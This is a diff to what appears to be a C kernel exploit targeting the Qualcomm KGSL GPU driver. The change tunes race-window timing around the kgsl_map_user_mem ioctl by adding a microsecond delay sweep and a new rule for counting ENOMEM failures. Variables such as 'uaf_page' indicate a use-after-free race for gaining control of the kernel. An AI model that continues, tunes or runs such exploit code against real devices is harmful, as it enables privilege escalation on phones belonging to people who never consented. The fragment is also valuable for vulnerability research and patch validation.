@@ -343,11 +343,17 @@ static void race_delay_sleep(int us) {
     while (nanosleep(&ts, &ts) < 0 && errno == EINTR) {}
 }
 static int race_delay_for_try(int attempt) {
+    static const int sweep_us[] = {
+        0, 5, 10, 15, 20, 25, 30, 40, 50, 60,
+        75, 90, 110, 140, 180, 230, 300, 400, 550, 750,
+    };
     if (g_race_delay_fixed) return g_race_delay_us;
-    if (g_last_ioctl_us <= 0) return 0;
-    long long delay = g_last_ioctl_us * attempt / (MAX_RACE_TRIES - 1);
-    if (delay > 100000) delay = 100000;
-    return (int)delay;
+    if (g_last_ioctl_us > 0) {
+        long long delay = g_last_ioctl_us * attempt / (MAX_RACE_TRIES - 1);
+        if (delay > 100000) delay = 100000;
+        return (int)delay;
+    }
+    return sweep_us[attempt % (int)(sizeof(sweep_us) / sizeof(sweep_us[0]))];
 }
 
 static void terminate_children_and_exit(int signal_number)
@@ -652,19 +658,19 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
     int64_t ioctl_us = 0;
     int racer_enomem = 0;
     for (int i = 0; i < created; i++) {
-        if (ra[i].ret != 0 && ra[i].err == ENOMEM) {
+        if (ra[i].ret != 0 && ra[i].err == ENOMEM)
             racer_enomem = 1;
-            continue;
-        }
         int64_t duration = ra[i].t1_us - ra[i].t0_us;
         if (duration > ioctl_us) ioctl_us = duration;
     }
     if (mmap_enomem || racer_enomem) g_last_race_errno = ENOMEM;
-    /* A failed ioctl returns early, so its duration says nothing about the
-     * real window; keep the last good measurement instead of poisoning the
-     * sweep with it. */
-    if (ioctl_us > 0) g_last_ioctl_us = ioctl_us;
-    if (verbose && ioctl_us > 0)
+    /*
+     * kgsl_map_user_mem normally fails with ENOMEM here (the huge bogus
+     * range), but the time it spends in the driver is still the real
+     * window.  Only the few-microsecond early failures say nothing.
+     */
+    if (ioctl_us >= 10) g_last_ioctl_us = ioctl_us;
+    if (verbose && ioctl_us >= 10)
         printf("[*] racer ioctl took %lldus (mmap delay %dus)\n",
                (long long)ioctl_us, g_race_delay_us);
 
